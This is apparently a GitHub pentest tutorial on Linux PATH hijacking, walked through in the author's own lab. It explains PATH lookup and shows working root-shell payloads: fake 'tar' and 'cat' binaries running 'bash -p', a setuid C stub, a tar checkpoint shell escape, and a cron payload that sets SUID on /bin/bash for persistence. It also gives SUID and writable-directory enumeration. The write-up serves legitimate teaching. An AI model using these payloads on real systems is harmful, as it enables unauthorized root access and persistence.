<h1 align="center"> PATH Hijacking </h1>

![Privileged-Path-Hijack-Alert_Post-3-17](https://github.com/user-attachments/assets/768ae549-a25e-4f38-9759-7b8b185005a8)




## Content Table Of Path Hijacking:
- [Basic Usage PATH](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/1.%20Linux_Privilege_Escalation/3.%20PATH_Hijacking.md#basic-usage-path)
- [A vulnerable Program](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/1.%20Linux_Privilege_Escalation/3.%20PATH_Hijacking.md#a-vulnerable-program)
- [Identify Vulnerable Programs](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/1.%20Linux_Privilege_Escalation/3.%20PATH_Hijacking.md#identify-vulnerable-programs)
- [Real-World Attack Scenarios](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/1.%20Linux_Privilege_Escalation/3.%20PATH_Hijacking.md#real-world-attack-scenarios)




## What is Path Hijacking?
**PATH Hijacking**: Is a privilege escalation technique where an attacker exploits the way linux systems search for executable programs. By manipulating the PATH environment variable, an attacker can trick privileged programs into executing malicious code instead of legitimate system binaries.

- When we launch a program, for example in the shell, we typically just write the name of the program. For exmaple, if I want to list out all the files in a given directory, I can use the `ls` program as follows.



## How is the Path hijackign used?
Path hijacking is used by planting a malicious binary in a writable directory that appears earlier in `$PATH`. When a privileged process calls a command without its full path, your binary runs instead, giving you elevated privileges.



## Understanding the PATH Environment Variable

### What is the PATH?
The `PATH` is an environment variable that tells the shell which directories to search for executable files when you type a command.
- View PATH:
````
echo $PATH
````
<img width="742" height="93" alt="image" src="https://github.com/user-attachments/assets/75fc2e4a-0364-49b5-9427-6d41cd245782" />

### How Command Execution Wors:
1. I type `ls`
2. System searches directories in this order:
   - `/usr/local/sbin/ls`
   - `/usr/local/bin/ls`
   - `/usr/sbin/ls`
   - `/usr/bin/ls` ← FOUND HERE!
   - `/sbin/ls`
   - `/bin/ls`
   - ...and so on




### The Vulnerability Explained

#### Scenario:
A script or program calls system commands without using full paths:

- Vulnerable Code:
````
#!/bin/bash
ls -la /home/
````
- This is vulnerable - uses relative command


- **Secure Code**:
````
#!/bin/bash
/bin/ls -la /home/
````
- This is secure - uses full path


- **The Attack**:
If an attacker can control what "ls" means by manipulating PATH, they can execute their own code with the privileges of the vulnerable script.

---






# Path Hijacking Methodology 

## Basic Usage PATH:
- Now, how does the shell process know which command to execute?
Remember that in modern operating systems, resources are located in specific paths of a file system. All sorts of resources are located like that. Even binaries, which are the programs we use to do various activities.
- This means that before executing the command, the shell needs to resolve its full path, that is, it needs to know where does the program reside within the file system. This is where the concept of a PATH comes in.
- **IMPORTANT**: The PATH is an environment variable, found within the shell and other processes as well, which determines the folders to look in order to resolve command names into full paths."
- In order to print the value of `PATH`, within the shell `bash` we can execute following command.



- If i type:
````
ls
````
<img width="902" height="99" alt="image" src="https://github.com/user-attachments/assets/ff57d6ed-793f-4320-a997-13d756612c8e" />


````
echo $PATH
````
<img width="763" height="91" alt="image" src="https://github.com/user-attachments/assets/f5d038d3-7f0c-49f6-a768-5cce1707ccb5" />

- In this we see:
````
/home/lowpriv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
````
- If `/home/lowpriv/bin` comes before `/bin`, you can hijack `tar`.


- Create a Malicious Binary
````
mkdir -p /home/lowpriv/bin
echo -e '#!/bin/bash\nbash -p' > /home/lowpriv/bin/tar
chmod +x /home/lowpriv/bin/tar
````
<img width="852" height="144" alt="image" src="https://github.com/user-attachments/assets/ecd1b01c-af00-418f-8745-00a40b003d37" />


- This fake `tar` just spawns a root shell using `bash -p`, which preserves elevated privileges.


- Prepend your malicious path to `$PATH`:
````
export PATH=/home/lowpriv/bin:$PATH
which tar
````
<img width="642" height="138" alt="image" src="https://github.com/user-attachments/assets/54c1e47e-00c1-4386-a699-f661dda8eb53" />


- Run 
````
sudo -l
sudo tar
````
<img width="955" height="260" alt="image" src="https://github.com/user-attachments/assets/536767fd-3c83-4e24-b821-a67d5b53ccf4" />

- But in this we need `root`.

````
su -
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
````
<img width="954" height="413" alt="image" src="https://github.com/user-attachments/assets/3e65258d-4934-488c-8c78-f66bfafaeeed" />

- In this we got two of root.

### **PATH**:
#### $PATH
````
echo $PATH
````
<img width="927" height="94" alt="image" src="https://github.com/user-attachments/assets/cdcb0fa7-f243-4de4-b723-a757f21bc00b" />

- `echo`: This command simply prints text or the value of variable to the terminal.
- `$PATH`: The `$` tell the shell to substitute the value of the environment variable named `PATH`.
- **`PATH` variable**: A special environment variable that contains a **colon-separated list of directories**. These are the directories the shell searches when you type a command.
- This command use for prints out the current search path your shell uses to find executables. And shows you the directories the shell searches to resolve commands. It’s a quick way to understand how your environment finds executables — and a critical piece of privilege escalation labs.

- **Output**:
````
/home/lowpriv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
````
- This means:
  - When you type a command like , the shell looks in  first.
  - If it doesn’t find  there, it checks , then , and so on.
  - The search stops as soon as it finds the first matching executable.


#### $HOME
````
echo $HOME
````
<img width="367" height="108" alt="image" src="https://github.com/user-attachments/assets/5faef9e1-a266-41c2-aea9-eaef3a97cf89" />

- `$HOME`: The `$` tells the shell to substitute the value of the environment variable named `HOME`.
- **`HOME` variable**: This environment variable stores the path to the current user’s home directory.
- `echo $HOME`: the shell prints the location of your home directory. And shows the absolute path of your home directory. It’s a quick way to confirm where your personal files and configurations live.


- Output:
````
/home/lowpriv
````
- This mean the home directory for the user `lowpriv` is `/home/lowpriv`.



#### PATH used
- Now, how is PATH used?
Simple, when you launch a program without a full path, such as when we just executed the command `ls`, the shell will use this list of folders in order to look for the `ls` binary. It will start from the first folder, and, until it has found an `ls` binary, it will keep looking for further folders, until all of them have been checked.

In the case of , it will do the following:
````
/home/lowpriv/bin
/usr/local/sbin
/usr/local/bin
/usr/sbin
/usr/bin
/sbin
/bin
/usr/games
````

- Use command:
````
file /home/lowpriv/bin
file /usr/local/sbin
file /usr/local/bin
````
<img width="523" height="167" alt="image" src="https://github.com/user-attachments/assets/3d4580f4-4b17-4234-bfcc-c2d8a38c3d95" />


- Check type:
````
file /home/lowpriv/bin
````
<img width="930" height="91" alt="image" src="https://github.com/user-attachments/assets/8b099ae5-56c9-4641-bee6-925d23cba98c" />

- The `file` command tells you what type of object a path is.
- And output mean `/home/lowpriv/bin`  is a directory, not a regular file or binary.



#### which command:
- To understand how a given command is resolved, we can use the binary `which`. This binary uses the PATH in exactly the same we just descripted in order to rpint out the full path of the command.
````
which ls
````
<img width="368" height="103" alt="image" src="https://github.com/user-attachments/assets/bbc5e132-474c-4c2d-b148-618dd8e38a0f" />

- `which`: command shows the **full path** of the executable that will run when you type a command.
- `ls`: is the **list** command in Linux / Unix shells.
- contents of directory (files, folders, links).

- In this we can use with like:
````
which whoami
````
<img width="401" height="100" alt="image" src="https://github.com/user-attachments/assets/0993b1ab-3d07-400f-b95c-c285aaa667b4" />

````
/usr/bin/which which
````
<img width="482" height="91" alt="image" src="https://github.com/user-attachments/assets/24b9301b-7c14-4f9a-b0a9-6834d77bbce2" />

---


## A vulnerable Program
````
ls
strings test.txt
````
<img width="472" height="100" alt="image" src="https://github.com/user-attachments/assets/c2c982e0-2119-42f8-b4a9-49818285be06" />


### Execute command:
If there is a vulnerable SUID binary on the system (let's call it vuln_binary) that uses cat, follow these steps:

#### Prepare the Trap
````
echo -en '#!/usr/bin/env sh\n/bin/bash\n' > cat
chmod +x cat
ls
````
<img width="745" height="133" alt="image" src="https://github.com/user-attachments/assets/6fd13dbf-a973-4392-8632-85b4dcb387ef" />

- `echo -en`:
  - `echo`: prints text to standard ouput.
  - `-e`: enable interpretation of escape sepuences like `\n` (newline).
  - `-n`: suppresses the trailing newline that `echo` normal adds.
- `` `#!/usr/bin/env sh\n/bin/bash\n` ``:
  - This is the string being printed.
  - `#!/usr/bin/env sh`: The **shebang line**, tellimg the system to run the script with the `sh` shell.
  - `\n/bin/bash\n`: adds a newline, then the command `/bin/bash`, then anther newline.
- `>cat`:
  - Redirects the ouput into a file named `cat`.
  - So instead of printing to the terminal, the text is written into the file.


````
./cat
````
<img width="382" height="121" alt="image" src="https://github.com/user-attachments/assets/a434e590-c64b-4285-b549-867141353834" />

- After in this we got one more `shell`. IF we type `exit` we will see one more `shell`.




#### Checklist to verify:
- Find SUID files:
````
find / -perm -u=s -type f 2>/dev/null
````
<img width="656" height="343" alt="image" src="https://github.com/user-attachments/assets/fdc5bfc5-ee7e-4d7f-b349-28ff3b317347" />

- `find/`: Start searching from the root directory `/`.
- `perm -u=s`: Match files with the SUID bit set.
  - SUID (Set User ID) means when the file is executed, it runs with the permissions of the file’s owner (often root).
  - This is critical in privilege escalation labs because misconfigured SUID binaries can be abused.
  - `-type f`: Restrict results to regular files (not directories, sockets, etc.).
  - `2>/dev/null`: Redirect stderr (file descriptor 2) to `/dev/null`.
    - This hides permission-denied errors that would otherwise clutter the output.


### Hijack a command used in a root cron job
````
sudo nano backup.sh
````
<img width="990" height="114" alt="image" src="https://github.com/user-attachments/assets/95a9b239-f5d4-469f-836f-9c6ec60fb4d9" />

- But in this we need `root`.


#### Find the vulnerable cron job
````
cat /etc/crontab
````
<img width="1032" height="473" alt="image" src="https://github.com/user-attachments/assets/5dd55a02-f3dc-4b6d-9639-b56e5c87c3d2" />

---


- Exploit:
````
nano exploit.c
````
````
#include <unistd.h>
#include <stdlib.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
````
<img width="354" height="108" alt="image" src="https://github.com/user-attachments/assets/6e0d8ffa-187d-49e3-9a40-fe5bc46b82c6" />

<img width="549" height="304" alt="image" src="https://github.com/user-attachments/assets/1c604c4d-73cc-4b68-ad36-e5fc1e95136f" />

- After press `Ctrl + O` -> `Enter` -> `Ctrl + X`.

````
ls
````
<img width="342" height="140" alt="image" src="https://github.com/user-attachments/assets/872d1056-e944-4a86-9401-4ce9d28e887d" />


- In this i complie the C source into an executable named `cat`:
````
gcc exploit.c -o cat
````
<img width="427" height="60" alt="image" src="https://github.com/user-attachments/assets/d60fba26-7cd6-4d68-a003-c262319fbe10" />


- Make the payload Executable:
````
chmod +x cat
````
<img width="356" height="82" alt="image" src="https://github.com/user-attachments/assets/881547d6-8a1e-4f6d-ac0e-9896230691f2" />


- Hijack the PATH Environment and verify:
````
export PATH=.:$PATH
echo $PATH
````
<img width="937" height="110" alt="image" src="https://github.com/user-attachments/assets/3a12617f-e9a4-4106-9872-ce3726c0c123" />

- `PATH`: 
  - This environment variable tells the shell where to look for executables when you type a command.
  - It’s a colon-separated list of directories (e.g., `/usr/bin:/bin:/usr/local/bin`).
- `.`:
  - The dot `.` represents the current working directory.
  - By putting `.` at the front of `PATH`, you’re telling the shell: “Look in the current directory first when searching for commands.”
- `$PATH`:
  - Expands to the existing PATH value.
  - So you’re prepending `.` to whatever was already there.
- `export`: Makes the updated PATH available to all child processes of the shell.




- Execxute payload:
````
./cat
````
<img width="291" height="61" alt="image" src="https://github.com/user-attachments/assets/9890de75-fae4-4597-a339-debcc89d0911" />

- Now we got two shell. if i type `exit`:
<img width="307" height="127" alt="image" src="https://github.com/user-attachments/assets/ad28ce6c-1c65-4272-9883-9f1516fd5476" />

- If i type `Èxit` again:

<img width="289" height="142" alt="image" src="https://github.com/user-attachments/assets/e85331e9-5f09-4af6-aeb2-e63a49dd8de3" />

---




## Identify Vulnerable Programs
Look for:
- Scripts that use relative commands
- SUID binaries that call system() or popen()
- Cron jobs that execute scripts
- Sudo rules that allow command execution

### Enumeration Commands:

#### Find SUID binaries
````
find / -perm -4000 2>/dev/null
````
<img width="592" height="303" alt="image" src="https://github.com/user-attachments/assets/ab0cdff2-9c19-4bf4-8cab-9f1e8c6dcef1" />

````
cat /tmp/python_suid
strings /tmp/python_suid
````
<img width="494" height="822" alt="image" src="https://github.com/user-attachments/assets/9c09df6f-2756-4c84-9165-328f2f69b3be" />

- Now when i used `cat` it don't show something, bun when i used strings i see a lots.
- `cat`: simply prints the raw contents of a file to the terminal.
- `strings`: scans a binary file and extracts sequences of printable ASCII characters.
| Command     | Output                              | Use Case                                                       |
| ----------- | ----------------------------------- | -------------------------------------------------------------- |
| **cat**     | Raw binary data (mostly unreadable) | Viewing text files, **not** binaries                           |
| **strings** | Extracted readable text from binary | Inspecting executables for clues, debugging, security analysis |



#### Find writable directories in PATH
````
echo $PATH | tr ':' '\n'
find $(echo $PATH | tr ':' ' ') -type d -writable 2>/dev/null
````
<img width="799" height="592" alt="image" src="https://github.com/user-attachments/assets/61b08d03-78c3-4fa7-a3c3-a66191f1a745" />

- `echo $PATH`: prints the current PATH variable (colon-separated list of directories searched for executables).
- `tr':''\n'`: replaces colons `.` with newlines, so each directory appears on its own line.
- **Result**: You get a clean list of all directories in your PATH.


- `$(echo $PATH | tr ':' ' ')`: expands PATH into a space-separated list of directories, so `find` can search them.
- `-type d`: restricts search to directories.
- `-writable`: only list directories that the current user can write to.
- `2>/dev/null`: suppresses permission-denied errors.
- **Result**: You get a list of writable directories inside your PATH.






#### Check sudo permissions
````
sudo -l
````
<img width="1086" height="127" alt="image" src="https://github.com/user-attachments/assets/ef0641aa-d9ce-4324-ab08-fdb5be3b4009" />

#### Look for scripts with relative paths
````
grep -r "system(\|popen(\|exec(\|\.\/" /opt/ /home/ /var/ 2>/dev/null
````
<img width="1431" height="803" alt="image" src="https://github.com/user-attachments/assets/1011c2db-6733-4540-9d63-0c359b3d7357" />

- `grep -r`: recursively search through files in the given directories.
- `"system(\|popen(\|exec(\|\.\/"`: the search pattern:
  - `system(`: calls to the C system() function.
  - `popen(`: calls to popen().
  - `exec(`: calls to exec*() functions.
  - `./`: relative execution of binaries/scripts.
  - `\|`: is regex “OR”.
- `/opt/ /home/ /var/`: directories being searched.
- `2>/dev/null`: suppresses error messages (like permission denied).

- We can take above to use like this:
````
strings /var/lib/apt/lists/archive.ubuntu.com_ubuntu_dists_focal_multiverse_binary-amd64_Packages.lz4
````
<img width="1191" height="834" alt="image" src="https://github.com/user-attachments/assets/ed01b0a6-2bd9-4189-94b5-1dfa54cbf56d" />

---






## Real-World Attack Scenarios

### Vulnerable SUID Binary
- Victim's Vulnerable Code (vuln_program.c):
````
su -
nano vuln_program.c
````
<img width="433" height="108" alt="image" src="https://github.com/user-attachments/assets/d95e91f8-cfec-4a40-af03-0c73dcd71613" />
 

````
#include <stdlib.h>
#include <stdio.h>

int main() {
    // Vulnerable - uses system() without full path
    system("ls /root");
    return 0;
}
````
<img width="671" height="276" alt="image" src="https://github.com/user-attachments/assets/46d5edd0-e6a0-4f34-95b9-9ef856ed757f" />

- Press `Ctrl + O` -> `Enter` -> `Ctrl + X`.

- Compiled as SUID:
````
gcc vuln_program.c -o vuln_program
sudo chown root:root vuln_program
sudo chmod 4755 vuln_program
````
<img width="552" height="218" alt="image" src="https://github.com/user-attachments/assets/9d552983-96e1-45e2-a044-f734493a3ff1" />



### Attack:

#### Find the vulnerability
````
find / -perm -4000 -name "vuln_program" 2>/dev/null
````
<img width="710" height="111" alt="image" src="https://github.com/user-attachments/assets/cbea6523-d259-4d76-971f-d42762e23a6d" />

----



### Cron Job Exploitation
````
cat /etc/crontab
ls -la /etc/cron.*/*
crontab -l
````
<img width="934" height="711" alt="image" src="https://github.com/user-attachments/assets/2e1fd5e4-487f-4d21-af3b-5607082043b9" />

- This file defines scheduled jobs for the whole system.
- Entries like:
````
17 * * * * root cd / && run-parts --report /etc/cron.hourly
````
- - mean: at minute 17 of every hour, run all scripts in `/etc/cron.hourly` as root.

---




### Payload attack:
````
cat > /tmp/tar << 'EOF'
#!/bin/bash
# Payload
echo "Cron hijack by $(whoami) at $(date)" >> /tmp/cron_hijack.txt
chmod +s /bin/bash  # Make bash SUID for persistence
/usr/bin/tar "$@"   # Call real tar
EOF
````
````
chmod +x /tmp/tar
````
````
export PATH=/tmp:$PATH
````
````
ls -la /bin/bash
bash -p
````
<img width="671" height="344" alt="image" src="https://github.com/user-attachments/assets/d5b06dba-434e-48f8-b86c-15df32bda3b9" />

- Now we see we got one more shell.


---


<h2 align="center"> Finished Of PATH Hijacking </h2>

<h2 align="center"> Author: Nin Kanong (k4n0ng) </h2>

<h3 align="center"> Date: 1/12/2025 </h3>
